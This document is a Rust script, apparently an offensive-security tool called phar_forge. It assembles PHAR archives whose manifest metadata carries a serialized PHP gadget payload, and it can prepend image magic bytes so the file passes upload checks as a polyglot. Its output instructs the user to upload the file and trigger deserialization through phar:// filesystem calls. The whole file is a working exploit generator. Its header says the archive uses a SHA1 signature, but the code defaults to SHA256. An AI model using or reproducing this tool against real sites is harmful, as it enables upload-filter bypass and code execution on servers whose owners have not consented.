#!/usr/bin/env rust-script
//! name: phar_forge
//! description: PHAR 装配件 (phar forge) for phar:// deserialization - assemble a real phar archive (stub + manifest + SHA1 signature) whose manifest metadata is a caller-supplied serialized PHP payload, so any filesystem call on the uploaded file (file_exists/fopen/getimagesize on phar://...) unserializes it; --prefix prepends caller bytes (JPEG/PNG magic) to make the archive an image polyglot that passes upload validation, and %00 in the metadata expands to NUL so private/protected property names survive the shell. Reports archive size, metadata length, CRC32 and SHA1 so the payload can be re-verified offline.
//! version: 1.0.0
//! args: <meta-file|inline-%00> --out FILE [--prefix FILE] [--entry NAME] [--content STR] [--alias A] [--api 0x0011] [--sig sha256|sha1] [--selftest]
//! keywords: phar, php, deserialization, polyglot, gadget, unserialize, upload, archive

use pi_rust_lib::serde_json::json;
use std::io::Write;

fn p32(v: u32) -> [u8; 4] {
    v.to_le_bytes()
}

fn p16(v: u16) -> [u8; 2] {
    v.to_le_bytes()
}

fn crc32(data: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFF_FFFF;
    for &b in data {
        crc ^= b as u32;
        for _ in 0..8 {
            let mask = (crc & 1).wrapping_neg();
            crc = (crc >> 1) ^ (0xEDB8_8320 & mask);
        }
    }
    !crc
}

fn sha1(data: &[u8]) -> [u8; 20] {
    let mut h: [u32; 5] = [0x6745_2301, 0xEFCD_AB89, 0x98BA_DCFE, 0x1032_5476, 0xC3D2_E1F0];
    let mut msg = data.to_vec();
    let bitlen = (data.len() as u64) * 8;
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&bitlen.to_be_bytes());
    for chunk in msg.chunks(64) {
        let mut w = [0u32; 80];
        for i in 0..16 {
            w[i] = u32::from_be_bytes([chunk[4 * i], chunk[4 * i + 1], chunk[4 * i + 2], chunk[4 * i + 3]]);
        }
        for i in 16..80 {
            w[i] = (w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]).rotate_left(1);
        }
        let (mut a, mut b, mut c, mut d, mut e) = (h[0], h[1], h[2], h[3], h[4]);
        for (i, wi) in w.iter().enumerate() {
            let (f, k) = match i {
                0..=19 => ((b & c) | ((!b) & d), 0x5A82_7999u32),
                20..=39 => (b ^ c ^ d, 0x6ED9_EBA1),
                40..=59 => ((b & c) | (b & d) | (c & d), 0x8F1B_BCDC),
                _ => (b ^ c ^ d, 0xCA62_C1D6),
            };
            let temp = a
                .rotate_left(5)
                .wrapping_add(f)
                .wrapping_add(e)
                .wrapping_add(k)
                .wrapping_add(*wi);
            e = d;
            d = c;
            c = b.rotate_left(30);
            b = a;
            a = temp;
        }
        h[0] = h[0].wrapping_add(a);
        h[1] = h[1].wrapping_add(b);
        h[2] = h[2].wrapping_add(c);
        h[3] = h[3].wrapping_add(d);
        h[4] = h[4].wrapping_add(e);
    }
    let mut out = [0u8; 20];
    for i in 0..5 {
        out[4 * i..4 * i + 4].copy_from_slice(&h[i].to_be_bytes());
    }
    out
}

const K256: [u32; 64] = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
];

fn sha256(data: &[u8]) -> [u8; 32] {
    let mut h: [u32; 8] = [
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
    ];
    let mut msg = data.to_vec();
    let bitlen = (data.len() as u64) * 8;
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&bitlen.to_be_bytes());
    for chunk in msg.chunks(64) {
        let mut w = [0u32; 64];
        for i in 0..16 {
            w[i] = u32::from_be_bytes([chunk[4 * i], chunk[4 * i + 1], chunk[4 * i + 2], chunk[4 * i + 3]]);
        }
        for i in 16..64 {
            let s0 = w[i - 15].rotate_right(7) ^ w[i - 15].rotate_right(18) ^ (w[i - 15] >> 3);
            let s1 = w[i - 2].rotate_right(17) ^ w[i - 2].rotate_right(19) ^ (w[i - 2] >> 10);
            w[i] = w[i - 16]
                .wrapping_add(s0)
                .wrapping_add(w[i - 7])
                .wrapping_add(s1);
        }
        let (mut a, mut b, mut c, mut d, mut e, mut f, mut g, mut hh) =
            (h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7]);
        for (i, wi) in w.iter().enumerate() {
            let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
            let ch = (e & f) ^ ((!e) & g);
            let t1 = hh
                .wrapping_add(s1)
                .wrapping_add(ch)
                .wrapping_add(K256[i])
                .wrapping_add(*wi);
            let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
            let maj = (a & b) ^ (a & c) ^ (b & c);
            let t2 = s0.wrapping_add(maj);
            hh = g;
            g = f;
            f = e;
            e = d.wrapping_add(t1);
            d = c;
            c = b;
            b = a;
            a = t1.wrapping_add(t2);
        }
        h[0] = h[0].wrapping_add(a);
        h[1] = h[1].wrapping_add(b);
        h[2] = h[2].wrapping_add(c);
        h[3] = h[3].wrapping_add(d);
        h[4] = h[4].wrapping_add(e);
        h[5] = h[5].wrapping_add(f);
        h[6] = h[6].wrapping_add(g);
        h[7] = h[7].wrapping_add(hh);
    }
    let mut out = [0u8; 32];
    for i in 0..8 {
        out[4 * i..4 * i + 4].copy_from_slice(&h[i].to_be_bytes());
    }
    out
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

/// Substitute %00 (case-insensitive) with real NUL bytes so mangled
/// private/protected property names survive argv/file transport.
fn expand_nul(s: &str) -> Vec<u8> {
    let mut out = Vec::with_capacity(s.len());
    let b = s.as_bytes();
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' && i + 2 < b.len() && b[i + 1] == b'0' && b[i + 2] == b'0' {
            out.push(0);
            i += 3;
        } else {
            out.push(b[i]);
            i += 1;
        }
    }
    out
}

/// PHP itself terminates the stub with CRLF; keep it byte-identical to PHP output
const STUB: &str = "<?php __HALT_COMPILER(); ?>\r\n";
/// per-file flags: 0644, no compression
const ENTRY_FLAGS: u32 = 0x0000_01A4;
/// global flags: Phar::NONE (archive is uncompressed)
const GLOBAL_FLAGS: u32 = 0x0001_0000;
/// signature type ids as stored in the trailer: 2 = SHA1, 3 = SHA256
const SIG_SHA1: u32 = 2;
const SIG_SHA256: u32 = 3;

/// Build the phar byte stream: prefix + stub + manifest + sha1 signature.
fn build(
    prefix: &[u8],
    metadata: &[u8],
    entry_name: &str,
    content: &[u8],
    alias: &str,
    api: u16,
    timestamp: u32,
    sig_type: u32,
) -> Vec<u8> {
    let mut manifest: Vec<u8> = Vec::new();
    manifest.extend_from_slice(&p32(1)); // number of files
    manifest.extend_from_slice(&p16(api));
    manifest.extend_from_slice(&p32(GLOBAL_FLAGS));
    manifest.extend_from_slice(&p32(alias.len() as u32));
    manifest.extend_from_slice(alias.as_bytes());
    manifest.extend_from_slice(&p32(metadata.len() as u32));
    manifest.extend_from_slice(metadata);
    // single file entry
    manifest.extend_from_slice(&p32(entry_name.len() as u32));
    manifest.extend_from_slice(entry_name.as_bytes());
    manifest.extend_from_slice(&p32(content.len() as u32));
    manifest.extend_from_slice(&p32(timestamp));
    manifest.extend_from_slice(&p32(content.len() as u32)); // compressed == uncompressed
    manifest.extend_from_slice(&p32(crc32(content)));
    manifest.extend_from_slice(&p32(ENTRY_FLAGS));
    manifest.extend_from_slice(&p32(0)); // per-file metadata length
    manifest.extend_from_slice(content);

    let mut out: Vec<u8> = Vec::new();
    out.extend_from_slice(prefix);
    out.extend_from_slice(STUB.as_bytes());
    // PHP's manifest length field counts everything after the file-count field
    out.extend_from_slice(&p32((manifest.len() - 4) as u32));
    out.extend_from_slice(&manifest);
    // signature trailer: hash bytes + type id + GBMB, hashing every prior byte
    if sig_type == SIG_SHA1 {
        out.extend_from_slice(&sha1(&out));
    } else {
        out.extend_from_slice(&sha256(&out));
    }
    out.extend_from_slice(&p32(sig_type));
    out.extend_from_slice(b"GBMB");
    out
}

fn read_src(s: &str) -> Result<Vec<u8>, String> {
    if std::path::Path::new(s).is_file() {
        let raw = std::fs::read(s).map_err(|e| format!("read {s}: {e}"))?;
        Ok(expand_nul(&String::from_utf8_lossy(&raw)))
    } else {
        Ok(expand_nul(s))
    }
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.is_empty() {
        pi_rust_lib::report::failure(
            "phar_forge",
            "usage: <meta-file|inline-%00> --out FILE [--prefix FILE] [--entry NAME] [--content STR] [--alias A] [--api 0x0011] [--sig sha256|sha1] [--selftest]",
            "pass the serialized PHP metadata for the phar manifest",
        );
        std::process::exit(2);
    }

    let mut src: Option<String> = None;
    let mut out_path: Option<String> = None;
    let mut prefix_path: Option<String> = None;
    let mut entry_name = "test.txt".to_string();
    let mut content = b"test".to_vec();
    let mut alias = String::new();
    let mut api: u16 = 0x0011;
    let mut sig_type: u32 = SIG_SHA256;
    let mut selftest = false;
    let mut timestamp: u32 = 0;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--out" | "-o" => {
                i += 1;
                out_path = args.get(i).cloned();
            }
            "--prefix" => {
                i += 1;
                prefix_path = args.get(i).cloned();
            }
            "--entry" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    entry_name = v.clone();
                }
            }
            "--content" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    content = v.as_bytes().to_vec();
                }
            }
            "--alias" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    alias = v.clone();
                }
            }
            "--api" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    let v = v.trim_start_matches("0x");
                    api = u16::from_str_radix(v, 16).unwrap_or(0x0011);
                }
            }
            "--sig" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    sig_type = if v.eq_ignore_ascii_case("sha1") { SIG_SHA1 } else { SIG_SHA256 };
                }
            }
            "--timestamp" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    timestamp = v.parse().unwrap_or(0);
                }
            }
            "--selftest" => selftest = true,
            other => {
                if !other.starts_with("--") && src.is_none() {
                    src = Some(other.to_string());
                }
            }
        }
        i += 1;
    }

    if selftest {
        let meta = b"s:4:\"test\";".to_vec();
        let bytes = build(b"\xff\xd8\xff\xe0", &meta, "test.txt", b"test", "", 0x0011, 0, SIG_SHA256);
        // re-verify our own framing: stub, manifest length, crc, signature trailer
        let stub_at = bytes
            .windows(STUB.len())
            .position(|w| w == STUB.as_bytes())
            .unwrap_or(usize::MAX);
        let mut ok = stub_at == 4;
        let mlen_at = stub_at + STUB.len();
        let mlen = u32::from_le_bytes([
            bytes[mlen_at],
            bytes[mlen_at + 1],
            bytes[mlen_at + 2],
            bytes[mlen_at + 3],
        ]) as usize;
        // manifest bytes (without the 4-byte count field) plus length field plus trailer
        ok &= mlen_at + 4 + 4 + mlen + 40 == bytes.len();
        ok &= crc32(b"test") == 0xd87f_7e0c;
        let sig = sha256(&bytes[..bytes.len() - 40]);
        ok &= hex(&sig) == hex(&bytes[bytes.len() - 40..bytes.len() - 8]);
        ok &= u32::from_le_bytes([
            bytes[bytes.len() - 8],
            bytes[bytes.len() - 7],
            bytes[bytes.len() - 6],
            bytes[bytes.len() - 5],
        ]) == SIG_SHA256;
        ok &= &bytes[bytes.len() - 4..] == b"GBMB";
        let data = json!({
            "selftest": if ok { "ok" } else { "fail" },
            "bytes": bytes.len(),
            "crc32_test": format!("{:08x}", crc32(b"test")),
            "sha1_abc": hex(&sha1(b"abc")),
            "sha256_abc": hex(&sha256(b"abc")),
        });
        pi_rust_lib::report::success("phar_forge", data, "framing verified; forge a real metadata payload")
            .unwrap_or(());
        if !ok {
            std::process::exit(1);
        }
        return;
    }

    let src = match src {
        Some(s) => s,
        None => {
            pi_rust_lib::report::failure(
                "phar_forge",
                "no metadata source given",
                "pass the serialized PHP payload (file path or inline with %00 for NUL)",
            );
            std::process::exit(2);
        }
    };
    let metadata = match read_src(&src) {
        Ok(m) => m,
        Err(e) => {
            pi_rust_lib::report::failure("phar_forge", &e, "check the metadata path");
            std::process::exit(2);
        }
    };
    let prefix = match prefix_path {
        Some(p) => match std::fs::read(&p) {
            Ok(b) => b,
            Err(e) => {
                pi_rust_lib::report::failure("phar_forge", &format!("read prefix {p}: {e}"), "check --prefix path");
                std::process::exit(2);
            }
        },
        None => Vec::new(),
    };

    let bytes = build(&prefix, &metadata, &entry_name, &content, &alias, api, timestamp, sig_type);
    let out_path = match out_path {
        Some(p) => p,
        None => "/tmp/payload.phar".to_string(),
    };
    let mut f = match std::fs::File::create(&out_path) {
        Ok(f) => f,
        Err(e) => {
            pi_rust_lib::report::failure("phar_forge", &format!("create {out_path}: {e}"), "check the out path");
            std::process::exit(2);
        }
    };
    if let Err(e) = f.write_all(&bytes) {
        pi_rust_lib::report::failure("phar_forge", &format!("write {out_path}: {e}"), "check disk space");
        std::process::exit(2);
    }

    let stub_at = bytes
        .windows(STUB.len())
        .position(|w| w == STUB.as_bytes())
        .unwrap_or(usize::MAX);
    let data = json!({
        "out": out_path,
        "bytes": bytes.len(),
        "prefix_bytes": prefix.len(),
        "metadata_len": metadata.len(),
        "metadata_preview": String::from_utf8_lossy(&metadata).replace('\0', "\\0"),
        "stub_offset": stub_at,
        "entry": {"name": entry_name, "content_len": content.len(), "crc32": format!("{:08x}", crc32(&content))},
        "signature_hash": hex(&bytes[bytes.len()-40..bytes.len()-8]),
        "signature_type": if sig_type == SIG_SHA1 { "sha1" } else { "sha256" },
        "signature_magic": "GBMB",
        "hint": "access it with phar://<abs path of the uploaded file> to force unserialize of the metadata",
    });
    pi_rust_lib::report::success("phar_forge", data, "upload the archive, then hit a filesystem call on phar://<path>")
        .unwrap_or(());
}
